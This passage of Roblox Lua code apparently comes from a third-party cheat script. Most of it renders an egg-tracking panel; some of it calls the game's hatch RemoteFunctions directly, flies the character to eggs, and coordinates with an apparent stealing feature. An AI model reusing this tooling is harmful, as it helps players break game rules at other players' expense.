				if guiInstance:IsA("GuiObject") and not guiInstance.Visible then
					return false
				end

				if guiInstance:IsA("LayerCollector") then
					return guiInstance.Enabled
				end
				guiInstance = guiInstance.Parent
			end

			return false
		end

		eggPredictorHelper.PageVisible = function()
			local ok, result = pcall(function()
				return eggPredictorSection.Page
			end)

			if not ok or typeof(result) ~= "Instance" then
				return true
			end
			return isShown(result) and result.AbsoluteSize.X > 0
		end

		eggPredictorHelper.IsShown = isShown
	end

	predictorSortOptions = { "Value", "Rarity", "Time Left" }

	predictorStatusCards = {
		{ Key = "Ready", Title = "READY TO HATCH", Color = eggPredictorHelper.Color.Ready },
		{ Key = "Growing", Title = "GROWING", Color = eggPredictorHelper.Color.Growing },
		{ Key = "Inventory", Title = "IN INVENTORY", Color = eggPredictorHelper.Color.Inventory },
	}

	paint = eggPredictorHelper.Paint
	bold = eggPredictorHelper.Bold
	predictorColors = eggPredictorHelper.Color
	predictorConfig = { Sort = predictorSortOptions[1], Spotlight = true }
	predictorFocusId = nil
	local predictorStrokeThickness = 0.0909
	predictorCanvas = nil
	local predictorControls = {}
	local predictorState = predictorControls
	local predictorIconStroke = predictorStrokeThickness
	local predictorUpdateInterval = 1
	local sortPredictorEggs, getOrCreateLineNode, getOrCreateEggEntryNode, formatEggSummary, matchEggSearch, updateSpotlightFocus, updateEggEntryUI
	predictorLineEntries = {}
	predictorLineNodes = {}
	predictorViewItems = {}
	local predictorAspectRatio = 0
	local predictorTextLifetime = 0
	local predictorRarityStroke = 0.06
	local predictorWidth = -1
	local predictorHeight = -1
	local predictorContentHeight = -1
	local predictorNameTextWidth = 4
	local predictorRarityTextWidth = 3
	predictorNeedsTextUpdate = false
	predictorViewIndex = 0
	predictorNeedsUpdate = true
	predictorTimeSinceUpdate = 0
	predictorWasVisible = false
	local predictorShowingSpotlight = nil

	requestEggRefresh = function()
		predictorNeedsUpdate = true
	end

	do
		local function wrapDrawingNode(drawingNode)
			if not drawingNode or drawingNode.DiffWrapped then
				return drawingNode
			end
			local originalSet = drawingNode.Set
			drawingNode.DiffWrapped = true

			drawingNode.Set = function(propsTable)
				if type(propsTable) ~= "table" then
					return originalSet(propsTable)
				end
				local spec = drawingNode.Spec
				local changes = nil

				for k, v in pairs(propsTable) do
					if spec[k] ~= v then
						changes = changes or {}
						changes[k] = v
					end
				end

				if changes then
					originalSet(changes)
				end

				return drawingNode
			end

			return drawingNode
		end

		local function getCacheKey(drawingNode, prefix)
			local text = string.gsub(tostring(drawingNode.Spec.Text or ""), "%d", "0")
			return tostring(predictorTextLifetime) .. "|" .. tostring(prefix) .. "|" .. text
		end

		local function getEggGrowthInfo(uid, serverTime)
			local eggRecords = gameModules.EggRecords
			if type(eggRecords) ~= "table" or type(eggRecords.GrowthSecondsRemaining) ~= "function" then
				return 0, 0
			end
			local speedMult = 1

			if type(eggRecords.GrowthSpeedMultiplier) == "function" then
				local ok, result = pcall(eggRecords.GrowthSpeedMultiplier, uid)

				if ok and type(result) == "number" then
					speedMult = result
				end
			end

			local ok, remaining = pcall(eggRecords.GrowthSecondsRemaining, uid, serverTime, speedMult)
			ok = ok and type(remaining) == "number"
			local fallbackRemaining = 0

			if not ok then
				remaining = fallbackRemaining
			end

			local duration = 0

			if type(eggRecords.GrowthDuration) == "function" then
				local ok2
				ok2, duration = pcall(eggRecords.GrowthDuration, uid)
				ok2 = ok2 and type(duration) == "number"
				local fallbackDuration = 0

				if not ok2 then
					duration = fallbackDuration
				end
			end

			return remaining, duration
		end

		local function getEggWeight(uid)
			local eggRecords = gameModules.EggRecords

			if type(eggRecords) == "table" and type(eggRecords.WeightKg) == "function" then
				local ok, result = pcall(eggRecords.WeightKg, uid)
				if ok and type(result) == "number" then
					return result
				end
			end

			return 0
		end

		fetchOwnerEggsInfo = function()
			local result = getOwnerEggs()
			if not result or type(result) ~= "table" then
				return nil
			end
			local eggState = getEggState()
			local serverTimeNow = workspace:GetServerTimeNow()
			local ownerEggs = {}

			for k, ownerEggEntry in pairs(result) do
				if type(ownerEggEntry) == "table" then
					local assetInfo = eggPredictorHelper.AssetInfo(ownerEggEntry.AssetCategory)
					local assetScale = tonumber(ownerEggEntry.AssetScale) or 0
					local mutations = type(ownerEggEntry.Mutations) == "table" and ownerEggEntry.Mutations or {}

					local eggData = {
						Id = k,
						Info = assetInfo,
						Scale = assetScale,
						Weight = getEggWeight(ownerEggEntry),
						Mutations = mutations,
						Income = eggPredictorHelper.Income(assetInfo, assetScale, mutations),
						Status = "Inventory",
						Remaining = math.huge,
						Percent = 0,
					}

					if ownerEggEntry.Placement ~= nil then
						local isReady = false
						if type(eggState) == "table" and type(eggState.IsReadyToHatch) == "function" then
							local ok2, ready = pcall(eggState.IsReadyToHatch, k)
							if ok2 and ready then
								isReady = true
							end
						end

						if not isReady and type(gameModules.EggRecords) == "table" and type(gameModules.EggRecords.IsGrown) == "function" then
							local growthMultiplier = tonumber(ownerEggEntry.GrowthSpeedMultiplier) or 1
							local nightCredit = type(gameModules.EggRecords.CurrentNightCredit) == "function" and gameModules.EggRecords.CurrentNightCredit(ownerEggEntry, serverTimeNow, growthMultiplier) or 0
							local ok3, grown = pcall(gameModules.EggRecords.IsGrown, ownerEggEntry, serverTimeNow, growthMultiplier, nightCredit, localPlayer)
							if ok3 and grown then
								isReady = true
							end
						end

						if isReady then
							eggData.Status = "Ready"
							eggData.Remaining = 0
							eggData.Percent = 100
						else
							local remaining, duration = getEggGrowthInfo(ownerEggEntry, serverTimeNow)
							eggData.Status = "Growing"
							eggData.Remaining = remaining

							if duration > 0 then
								eggData.Percent = math.clamp(math.floor((1 - remaining / duration) * 100), 0, 100)
							end
						end
					end

					table.insert(ownerEggs, eggData)
				end
			end

			return ownerEggs
		end

		sortPredictorEggs = function(eggsList)
			local sortMode = predictorConfig.Sort

			table.sort(eggsList, function(eggA, eggB)
				if sortMode == predictorSortOptions[2] and eggA.Info.RarityNumber ~= eggB.Info.RarityNumber then
					return eggA.Info.RarityNumber > eggB.Info.RarityNumber
				end

				if sortMode == predictorSortOptions[3] and eggA.Remaining ~= eggB.Remaining then
					return eggA.Remaining < eggB.Remaining
				end
				return eggA.Income > eggB.Income
			end)
		end

		local function formatEggStatusText(eggData)
			if eggData.Status == "Ready" then
				return bold(paint(predictorColors.Ready, "Ready to hatch"))
			end

			if eggData.Status == "Growing" then
				return bold(paint(predictorColors.Clock, eggPredictorHelper.FormatClock(eggData.Remaining))) .. eggPredictorHelper.Separator() .. paint(predictorColors.Growing, eggData.Percent .. "%")
			end
			return paint(predictorColors.Inventory, "In inventory")
		end

		local function formatEggDetailsText(eggData)
			local details = {}
			local mutationTxt = eggPredictorHelper.MutationText(eggData.Mutations)
			table.insert(details, bold(paint(predictorColors.Income, eggPredictorHelper.FormatRate(eggData.Income))))
			table.insert(details, paint(predictorColors.Scale, string.format("%.2fx", eggData.Scale)))
			table.insert(details, paint(predictorColors.Weight, eggPredictorHelper.FormatWeight(eggData.Weight)))

			if mutationTxt ~= "" then
				table.insert(details, mutationTxt)
			end

			return table.concat(details, eggPredictorHelper.Separator())
		end

		local predictorRowHeight = 5
		local predictorRowSpacing = predictorRowHeight + 0.8
		local predictorNameTextSize = 1.2
		local predictorStatusTextSize = 1.2
		local predictorDetailsTextSize = 0.936
		local predictorRowContentWidth = 2.3
		local predictorLeftIconX = 0.25
		local predictorRightIconX = 0.18
		local predictorActionButtonWidth = predictorRowContentWidth + 0.6
		local predictorRowIconSize = 0.24
		local predictorRowIconSpacing = 0.22

		local function getEggGradient(info)
			if string.upper(tostring(info.Rarity)) == "SECRET" then
				return eggPredictorHelper.SecretGradient
			end
			return info.Gradient
		end

		local function getEggColor(info)
			return getEggGradient(info) ~= nil and Color3.fromRGB(255, 255, 255) or info.Color
		end

		local function getEggGradientRotation(info)
			if string.upper(tostring(info.Rarity)) == "SECRET" then
				return eggPredictorHelper.SecretRotation
			end
			return nil
		end

		local function getDrawingTextBounds(textSlot)
			local drawingObj = textSlot and textSlot.Get()
			if not drawingObj or predictorTextLifetime <= 0 then
				return nil
			end

			if drawingObj.Text ~= tostring(textSlot.Spec.Text or "") then
				return nil
			end
			return drawingObj
		end

		local function calculateTextWidth(textSlot)
			local cacheKey = getCacheKey(textSlot, "w")
			if textSlot.WidthKey == cacheKey then
				return textSlot.WidthUnits
			end
			local drawingObj = getDrawingTextBounds(textSlot)
			if not drawingObj then
				return nil
			end
			local size = drawingObj.Size
			local textWrapped = drawingObj.TextWrapped
			drawingObj.TextWrapped = false
			drawingObj.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
			local x = drawingObj.TextBounds.X
			drawingObj.Size = size
			drawingObj.TextWrapped = textWrapped
			if x <= 0 then
				return nil
			end
			local widthUnits = x / predictorTextLifetime
			textSlot.WidthKey = cacheKey
			textSlot.WidthUnits = widthUnits
			return textSlot.WidthUnits
		end

		local function calculateTextHeight(textSlot, widthScale)
			local cacheKey = getCacheKey(textSlot, math.floor(widthScale * 100 + 0.5))
			if textSlot.HeightKey == cacheKey then
				return textSlot.HeightUnits
			end
			local drawingObj = getDrawingTextBounds(textSlot)
			if not drawingObj then
				return nil
			end
			local size = drawingObj.Size
			drawingObj.Size = UDim2.fromOffset(math.max(1, math.floor(widthScale * predictorTextLifetime + 0.5)), 100000)
			local y = drawingObj.TextBounds.Y
			drawingObj.Size = size
			if y <= 0 then
				return nil
			end
			local heightUnits = y / predictorTextLifetime
			textSlot.HeightKey = cacheKey
			textSlot.HeightUnits = heightUnits
			return textSlot.HeightUnits
		end

		local function requestEggHatch(eggUid)
			local rfEggWorldAskHatch = networking:FindFirstChild("RF/EggWorld/AskHatch")
			if not rfEggWorldAskHatch or not rfEggWorldAskHatch:IsA("RemoteFunction") then
				return false
			end
			local ok, result = pcall(rfEggWorldAskHatch.InvokeServer, rfEggWorldAskHatch, eggUid)
			if not ok or result == false then
				return false
			end
			task.wait(0.35)
			local rfEggWorldAskFinishHatch = networking:FindFirstChild("RF/EggWorld/AskFinishHatch")

			if rfEggWorldAskFinishHatch and rfEggWorldAskFinishHatch:IsA("RemoteFunction") then
				pcall(rfEggWorldAskFinishHatch.InvokeServer, rfEggWorldAskFinishHatch, eggUid)
			end

			return true
		end

		predictorState.RunAction = function()
			local focusEgg = predictorState.Focus
			if type(focusEgg) ~= "table" or focusEgg.Id == nil then
				return
			end
			local eggUid = tostring(focusEgg.Id)

			if focusEgg.Status == "Inventory" then
				local eggState = gameModules.EggState
				if type(eggState) == "table" and type(eggState.WearEggTool) == "function" and pcall(eggState.WearEggTool, eggUid) then
					return
				end
				local rfEggWorldAskWearTool = networking:FindFirstChild("RF/EggWorld/AskWearTool")

				if rfEggWorldAskWearTool and rfEggWorldAskWearTool:IsA("RemoteFunction") then
					pcall(rfEggWorldAskWearTool.InvokeServer, rfEggWorldAskWearTool, eggUid)
				end

				return
			end

			if focusEgg.Status == "Ready" then
				if not predictorState.Hatching then
					predictorState.Hatching = true
					pcall(requestEggHatch, eggUid)
					predictorState.Hatching = false
				end

				return
			end

			if predictorState.Flying or type(chilliState.FlyTo) ~= "function" then
				return
			end
			local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
			local targetRender = nil

			if placedEggRenders then
				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, eggUid, 1, true) or child:GetAttribute("Uid") == eggUid then
						targetRender = child
						break
					end
				end
			end

			if not targetRender then
				return
			end

			local ok, targetCFrame = pcall(function()
				return targetRender:IsA("Model") and targetRender:GetPivot() or targetRender.CFrame
			end)

			if not ok then
				return
			end
			local movement = chilliState.Movement
			if movement.Owner ~= nil and movement.Owner ~= "treadmill" or movement.PlaceWanted or chilliState.Steal.Active or chilliState.Steal.Wanted or chilliState.Steal.Carrying then
				return
			end
			predictorState.Flying = true

			if chilliState.ClaimMovement("predictor") then
				if chilliState.Treadmill.Riding or chilliState.OnBelt() then
					pcall(chilliState.ExitBelt)
				end

				pcall(chilliState.FlyTo, targetCFrame.Position + Vector3.new(0, 3, 0), function()
					return false
				end, "fly")

				chilliState.ReleaseMovement("predictor")
			end

			predictorState.Flying = false
		end

		setupPredictorCanvas = function(canvas)
			predictorCanvas = canvas
			canvas:SetDock(5, { Gap = predictorRowIconSpacing, DividerColor = Color3.fromRGB(170, 174, 184) })
			local dockContainer = canvas:Dock()

			predictorControls.Icon = canvas:Image({
				Parent = dockContainer,
				X = 0,
				Y = 0,
				Width = predictorRowHeight,
				Height = predictorRowHeight,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.26,
				StrokeThickness = predictorIconStroke,
				StrokeTransparency = 0,
				ZIndex = 8,
			})

			predictorControls.Name = canvas:Text({
				Parent = dockContainer,
				X = predictorRowSpacing,
				Y = 0,
				Height = predictorNameTextSize,
				Scale = predictorStatusTextSize,
				Wrap = false,
				Gradient = eggPredictorHelper.NameGradient,
				TextStrokeTransparency = 1,
				ZIndex = 9,
			})

			predictorControls.Rarity = canvas:Text({
				Parent = dockContainer,
				X = predictorRowSpacing,
				Y = 0,
				Height = predictorNameTextSize,
				Scale = predictorDetailsTextSize,
				Wrap = false,
				Font = eggPredictorHelper.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				ZIndex = 9,
			})

			predictorControls.Info = canvas:Text({ Parent = dockContainer, X = predictorRowSpacing, Y = predictorNameTextSize, Height = predictorRowHeight - predictorNameTextSize, Wrap = false, ZIndex = 9 })

			predictorControls.Action = canvas:Button({
				Parent = dockContainer,
				X = 0,
				Y = 0,
				Width = 5,
				Height = predictorNameTextSize - 0.1,
				Text = "",
				Scale = 1,
				Background = "#000000",
				BackgroundTransparency = 0.55,
				HoverTransparency = 0.3,
				PressTransparency = 0.15,
				Corner = 0.35,
				StrokeColor = Color3.fromRGB(255, 255, 255),
				StrokeThickness = predictorIconStroke,
				StrokeTransparency = 0.6,
				Visible = false,
				ZIndex = 10,
				Callback = function()
					if type(predictorControls.RunAction) == "function" then
						task.spawn(predictorControls.RunAction)
					end
				end,
			})

			canvas:OnResize(function(resizedCanvas, newWidth, newHeight)
				if newWidth == predictorWidth and newHeight == predictorHeight then
					return
				end
				predictorWidth = newWidth
				predictorHeight = newHeight
				predictorAspectRatio = newWidth / math.max(newHeight, 1)
				predictorTextLifetime = newHeight
				predictorViewIndex = 2
				predictorRarityStroke = 0.9 / math.max(canvas:TextSize(), 1)
				predictorControls.Rarity.Set({ StrokeThickness = predictorRarityStroke })

				for _, lineEntry in ipairs(predictorLineEntries) do
					lineEntry.Rarity.Set({ StrokeThickness = predictorRarityStroke })
				end
			end)

			for _, controlName in ipairs({ "Icon", "Name", "Rarity", "Info", "Action" }) do
				wrapDrawingNode(predictorControls[controlName])
			end
		end

		getOrCreateLineNode = function(index)
			local lineNode = predictorLineNodes[index]

			if not lineNode then
				lineNode = predictorCanvas:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
				predictorLineNodes[index] = wrapDrawingNode(lineNode)
			end

			return lineNode
		end

		getOrCreateEggEntryNode = function(index)
			local entryNode = predictorLineEntries[index]
			if entryNode then
				return entryNode
			end
			local eggEntry = {}

			eggEntry.Frame = predictorCanvas:Button({
				Name = "Entry",
				Text = "",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				HoverTransparency = 0.46,
				PressTransparency = 0.3,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
				Callback = function()
					if eggEntry.Id ~= nil then
						predictorFocusId = eggEntry.Id
						requestEggRefresh()
					end
				end,
			})

			eggEntry.Icon = predictorCanvas:Image({
				Parent = eggEntry.Frame,
				X = predictorLeftIconX,
				Y = 0,
				Width = predictorRowContentWidth,
				Height = predictorRowContentWidth,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.45,
				StrokeThickness = predictorIconStroke,
				StrokeTransparency = 0,
			})

			eggEntry.Name = predictorCanvas:Text({
				Parent = eggEntry.Frame,
				X = predictorLeftIconX + predictorActionButtonWidth,
				Y = 0,
				Width = 1,
				Height = predictorNameTextSize,
				Scale = predictorStatusTextSize,
				Wrap = false,
				Gradient = eggPredictorHelper.NameGradient,
				TextStrokeTransparency = 1,
			})

			eggEntry.Rarity = predictorCanvas:Text({
				Parent = eggEntry.Frame,
				X = predictorLeftIconX + predictorActionButtonWidth,
				Y = 0,
				Width = 1,
				Height = predictorNameTextSize,
				Scale = predictorDetailsTextSize,
				Wrap = false,
				Font = eggPredictorHelper.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				StrokeThickness = predictorRarityStroke,
			})

			eggEntry.Detail = predictorCanvas:Text({
				Parent = eggEntry.Frame,
				X = predictorLeftIconX + predictorActionButtonWidth,
				Y = predictorNameTextSize,
				Width = math.max(1, predictorAspectRatio - predictorActionButtonWidth - predictorLeftIconX * 2),
				Height = 1,
				Wrap = true,
			})

			eggEntry.Status = predictorCanvas:Text({ Parent = eggEntry.Frame, X = 0, Y = 0, Width = 1, Height = predictorNameTextSize, Wrap = false, Align = "Right" })

			for _, fieldName in ipairs({ "Frame", "Icon", "Name", "Rarity", "Detail", "Status" }) do
				wrapDrawingNode(eggEntry[fieldName])
			end

			predictorLineEntries[index] = eggEntry
			return eggEntry
		end

		formatEggSummary = function(eggsList)
			local statusCounts = { Ready = 0, Growing = 0, Inventory = 0 }
			local totalIncome = 0
			local bestEgg = nil

			for _, eggData in ipairs(eggsList) do
				local status = eggData.Status
				statusCounts[status] = statusCounts[status] + 1
				totalIncome += eggData.Income

				if not bestEgg or eggData.Income > bestEgg.Income then
					bestEgg = eggData
				end
			end

			return bold(paint(predictorColors.Text, tostring(#eggsList) .. " eggs")) .. eggPredictorHelper.Separator() .. bold(paint(predictorColors.Ready, statusCounts.Ready .. " ready")) .. eggPredictorHelper.Separator() .. bold(paint(predictorColors.Growing, statusCounts.Growing .. " growing")) .. eggPredictorHelper.Separator() .. bold(paint(predictorColors.Inventory, statusCounts.Inventory .. " in bag")) .. eggPredictorHelper.Separator() .. paint(predictorColors.Text, "Total") .. " " .. bold(paint(predictorColors.Income, eggPredictorHelper.FormatRate(totalIncome))), bestEgg
		end

		matchEggSearch = function(eggData, searchLower)
			if searchLower == "" then
				return true
			end
			local statusText = " " .. eggData.Status
			local combinedText = string.lower(tostring(eggData.Info.Name) .. " " .. tostring(eggData.Info.Rarity) .. statusText)

			for _, mutation in ipairs(eggData.Mutations) do
				combinedText ..= " " .. string.lower(tostring(mutation))
			end

			return string.find(combinedText, searchLower, 1, true) ~= nil
		end

		local function formatEggFocusDetails(eggData)
			local detailLines = {}
			local incomeText = bold(paint(predictorColors.Income, eggPredictorHelper.FormatRate(eggData.Income)))
			local statsText = paint(predictorColors.Scale, string.format("%.2fx", eggData.Scale)) .. eggPredictorHelper.Separator() .. paint(predictorColors.Weight, eggPredictorHelper.FormatWeight(eggData.Weight))
			detailLines[1] = incomeText
			detailLines[2] = statsText

			do
				local statusParts = table.pack(formatEggStatusText(eggData))
				table.move(statusParts, 1, statusParts.n, 3, detailLines)
			end

			local mutationText = eggPredictorHelper.MutationText(eggData.Mutations)
			table.insert(detailLines, mutationText ~= "" and mutationText or paint(predictorColors.Hint, "Tap an egg below to preview it"))
			return table.concat(detailLines, "\n")
		end

		updateSpotlightFocus = function(focusEgg)
			local showSpotlight = predictorConfig.Spotlight and focusEgg ~= nil

			if predictorShowingSpotlight ~= showSpotlight then
				predictorShowingSpotlight = showSpotlight
				predictorCanvas:SetDock(showSpotlight and 5 or 0, { Gap = predictorRowIconSpacing })
			end

			predictorControls.Icon.Set({ Visible = showSpotlight })
			predictorControls.Name.Set({ Visible = showSpotlight })
			predictorControls.Rarity.Set({ Visible = showSpotlight })
			predictorControls.Info.Set({ Visible = showSpotlight })
			predictorControls.Action.Set({ Visible = showSpotlight })
			predictorControls.Focus = showSpotlight and focusEgg or nil
			if not showSpotlight then
				return
			end
			local info = focusEgg.Info

			predictorControls.Action.Set({
				Text = focusEgg.Status == "Inventory" and bold(paint(predictorColors.Inventory, "Hold egg")) or focusEgg.Status == "Ready" and bold(paint(predictorColors.Ready, "Hatch egg")) or bold(paint(predictorColors.Growing, "Fly to egg")),
			})

			predictorControls.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
			predictorControls.Name.Set({ Text = eggPredictorHelper.Escape(info.Name) })

			predictorControls.Rarity.Set({
				Text = string.upper(tostring(info.Rarity)),
				Color = getEggColor(info),
				Gradient = getEggGradient(info),
				GradientRotation = getEggGradientRotation(info),
			})

			predictorControls.Info.Set({ Text = formatEggFocusDetails(focusEgg) })
			predictorControls.RunAction = predictorState.RunAction
		end

		updateEggEntryUI = function(entryNode, eggData)
			local info = eggData.Info
			entryNode.Id = eggData.Id
			entryNode.Frame.Set({ Visible = true, BackgroundTransparency = eggData.Id == predictorFocusId and 0.12 or 0.74 })
			entryNode.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
			entryNode.Name.Set({ Text = eggPredictorHelper.Escape(info.Name) })

			entryNode.Rarity.Set({
				Text = string.upper(tostring(info.Rarity)),
				Color = getEggColor(info),
				Gradient = getEggGradient(info),
				GradientRotation = getEggGradientRotation(info),
			})

			entryNode.Detail.Set({ Text = formatEggDetailsText(eggData) })
			entryNode.Status.Set({ Text = formatEggStatusText(eggData) })
		end

		refreshPredictorLayout = function()
			if predictorAspectRatio <= 0 then
				return
			end
			predictorNeedsTextUpdate = false
			local maxNameWidth = math.max(1, predictorAspectRatio - predictorRowSpacing)
			local actionWidth = calculateTextWidth(predictorControls.Action)

			if actionWidth then
				predictorControls.ActionUnits = actionWidth + 1.4
			else
				predictorNeedsTextUpdate = true
			end

			local actionButtonWidth = math.min(predictorControls.ActionUnits or 5, maxNameWidth * 0.45)
			local nameRarityAvailable = math.max(1, maxNameWidth - actionButtonWidth - predictorRowIconSize)
			predictorControls.Action.Set({ X = predictorAspectRatio - actionButtonWidth, Y = 0.05, Width = actionButtonWidth, Height = predictorNameTextSize - 0.1 })
			local rarityWidth = calculateTextWidth(predictorControls.Rarity)

			if rarityWidth then
				predictorRarityTextWidth = rarityWidth + 0.1
			else
				predictorNeedsTextUpdate = true
			end

			local nameWidth = calculateTextWidth(predictorControls.Name)

			if nameWidth then
				predictorNameTextWidth = math.min(nameWidth + 0.1, math.max(1, nameRarityAvailable - predictorRarityTextWidth - predictorRowIconSize))
			else
				predictorNeedsTextUpdate = true
			end

			predictorControls.Name.Set({ X = predictorRowSpacing, Y = 0, Width = predictorNameTextWidth, Height = predictorNameTextSize })

			predictorControls.Rarity.Set({
				X = predictorRowSpacing + predictorNameTextWidth + predictorRowIconSize,
				Y = 0,
				Width = math.max(0.5, math.min(predictorRarityTextWidth, nameRarityAvailable - predictorNameTextWidth - predictorRowIconSize)),
				Height = predictorNameTextSize,
			})

			predictorControls.Info.Set({ X = predictorRowSpacing, Y = predictorNameTextSize, Width = maxNameWidth, Height = math.max(1, predictorRowHeight - predictorNameTextSize) })
			local detailMaxWidth = math.max(1, predictorAspectRatio - predictorActionButtonWidth - predictorLeftIconX * 2)
			local currentY = 0

			for _, viewItem in ipairs(predictorViewItems) do
				if viewItem.Kind == "text" then
					local textHandle = viewItem.Handle
					local textHeight = calculateTextHeight(textHandle, predictorAspectRatio)

					if textHeight then
						viewItem.Height = textHeight
					else
						predictorNeedsTextUpdate = true
					end

					local itemHeight = math.max(1, viewItem.Height or 1)
					textHandle.Set({ X = 0, Y = currentY + (viewItem.Gap and 0.5 or 0), Width = predictorAspectRatio, Height = itemHeight })
					currentY += itemHeight + predictorRowIconSpacing * 0.5 + (viewItem.Gap and 0.5 or 0)
				else
					local eggEntry = viewItem.Item
					local detailHeight = calculateTextHeight(eggEntry.Detail, detailMaxWidth)

					if detailHeight then
						eggEntry.DetailUnits = detailHeight
					else
						predictorNeedsTextUpdate = true
					end

					local itemHeight = math.clamp(eggEntry.DetailUnits or 1, 1, 4)
					local statusWidth = calculateTextWidth(eggEntry.Status)

					if statusWidth then
						eggEntry.StatusUnits = statusWidth + 0.23
					else
						predictorNeedsTextUpdate = true
					end

					local statusMaxWidth = math.min(detailMaxWidth * 0.42, math.max(2.73, eggEntry.StatusUnits or 2.73))
					local nameRarityMaxWidth = math.max(1, detailMaxWidth - statusMaxWidth - predictorRowIconSize)
					local rarityWidth = calculateTextWidth(eggEntry.Rarity)

					if rarityWidth then
						eggEntry.RarityUnits = rarityWidth + 0.1
					else
						predictorNeedsTextUpdate = true
					end

					local rarityMaxWidth = math.min(eggEntry.RarityUnits or 3, nameRarityMaxWidth * 0.5)
					local nameWidth = calculateTextWidth(eggEntry.Name)

					if nameWidth then
						eggEntry.NameUnits = nameWidth + 0.1
					else
						predictorNeedsTextUpdate = true
					end

					local nameDisplayWidth = math.min(math.max(1, eggEntry.NameUnits or 4), math.max(1, nameRarityMaxWidth - rarityMaxWidth - predictorRowIconSize))
					local detailVerticalPadding = predictorRightIconX * 2
					local rowHeight = math.max(itemHeight + predictorNameTextSize, 2.3) + detailVerticalPadding
					local textVerticalOffset = (rowHeight - itemHeight - predictorNameTextSize) / 2
					eggEntry.Frame.Set({ X = 0, Y = currentY, Width = predictorAspectRatio, Height = rowHeight })
					eggEntry.Icon.Set({ Y = (rowHeight - predictorRowContentWidth) / 2 })
					eggEntry.Name.Set({ X = predictorLeftIconX + predictorActionButtonWidth, Y = textVerticalOffset, Width = nameDisplayWidth })
					eggEntry.Rarity.Set({ X = predictorLeftIconX + predictorActionButtonWidth + nameDisplayWidth + predictorRowIconSize, Y = textVerticalOffset, Width = math.max(0.5, rarityMaxWidth) })
					eggEntry.Detail.Set({ X = predictorLeftIconX + predictorActionButtonWidth, Y = textVerticalOffset + predictorNameTextSize, Width = detailMaxWidth, Height = itemHeight })

					eggEntry.Status.Set({
						Visible = viewItem.HasStatus,
						X = predictorLeftIconX + predictorActionButtonWidth + detailMaxWidth - statusMaxWidth,
						Y = textVerticalOffset,
						Width = math.max(0.5, statusMaxWidth),
					})

					currentY += rowHeight + predictorRowIconSpacing
				end
			end

			local totalHeight = math.max(1, currentY)

			if math.abs(totalHeight - predictorContentHeight) > 0.01 then
				predictorContentHeight = totalHeight
				predictorCanvas:SetContentLines(totalHeight)
			end
		end
	end
end

do
		updatePredictorCanvas = function()
			if not predictorCanvas then
				return
			end
			predictorViewIndex = 2
			local ownerEggs = fetchOwnerEggsInfo()
			table.clear(predictorViewItems)
			local lineCount = 0

			local function addTextLine(text, hasGap)
				lineCount += 1
				local lineNode = getOrCreateLineNode(lineCount)
				lineNode.Set({ Visible = true, Text = text })
				table.insert(predictorViewItems, { Kind = "text", Handle = lineNode, Gap = hasGap })
			end

			local entryCount

			if not ownerEggs then
				updateSpotlightFocus(nil)
				addTextLine(bold(paint(predictorColors.Hint, "Egg data is not available yet")), false)
				entryCount = 0
			else
				sortPredictorEggs(ownerEggs)
				local summaryText, bestEgg = formatEggSummary(ownerEggs)
				addTextLine(summaryText, false)
				local focusEgg = nil

				if predictorFocusId ~= nil then
					focusEgg = nil

					for _, eggData in ipairs(ownerEggs) do
						if eggData.Id == predictorFocusId then
							focusEgg = eggData
							break
						else
							focusEgg = nil
						end
					end
				end

				updateSpotlightFocus(focusEgg or bestEgg)
				local searchQuery = string.lower(predictorCanvas:Query())
				local matchingEggs = {}

				for _, eggData in ipairs(ownerEggs) do
					if matchEggSearch(eggData, searchQuery) then
						table.insert(matchingEggs, eggData)
					end
				end

				if #matchingEggs == 0 then
					addTextLine(paint(predictorColors.Hint, #ownerEggs == 0 and "No eggs yet" or string.format("No results for \"%s\"", eggPredictorHelper.Escape(searchQuery))), false)
					entryCount = 0
				else
					entryCount = 0

					for _, statusCard in ipairs(predictorStatusCards) do
						local cardEggs = {}

						for _, eggData in ipairs(matchingEggs) do
							if eggData.Status == statusCard.Key then
								table.insert(cardEggs, eggData)
							end
						end

						if #cardEggs > 0 then
							local hasExistingLines = #predictorViewItems > 0
							addTextLine(string.format("<b><font color=\"%s\">%s</font></b> <font color=\"#AAAAAA\">(%d)</font>", statusCard.Color, statusCard.Title, #cardEggs), hasExistingLines)

							for _, eggData in ipairs(cardEggs) do
								entryCount += 1
								local entryNode = getOrCreateEggEntryNode(entryCount)
								updateEggEntryUI(entryNode, eggData)
								table.insert(predictorViewItems, { Kind = "item", Item = entryNode, HasStatus = true })
							end
						end
					end
				end
			end

			for i = lineCount + 1, #predictorLineNodes do
				predictorLineNodes[i].Set({ Visible = false })
			end

			for i = entryCount + 1, #predictorLineEntries do
				predictorLineEntries[i].Frame.Set({ Visible = false })
			end

			refreshPredictorLayout()
			predictorViewIndex = 2
		end

	eggPredictorHelper.RequestEggRefresh = requestEggRefresh

	if not eggPredictorHelper.Ready then
		eggPredictorSection:CreateText({ Name = "Egg Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		eggPredictorSection:CreateDropdown({
			Name = "Sort By",
			Options = predictorSortOptions,
			Default = predictorSortOptions[1],
			Callback = function(selectedSort)
				if table.find(predictorSortOptions, selectedSort) then
					predictorConfig.Sort = selectedSort
					requestEggRefresh()
				end
			end,
		})

		eggPredictorSection:CreateToggle({
			Name = "Preview Card",
			Default = true,
			Callback = function(enabled)
				predictorConfig.Spotlight = enabled == true
				requestEggRefresh()
			end,
		})

		local predictorCanvasWidget = eggPredictorSection:CreateCanvas({
			Name = "Egg Predictor",
			Search = true,
			SearchPlaceholder = "Search eggs...",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 32,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
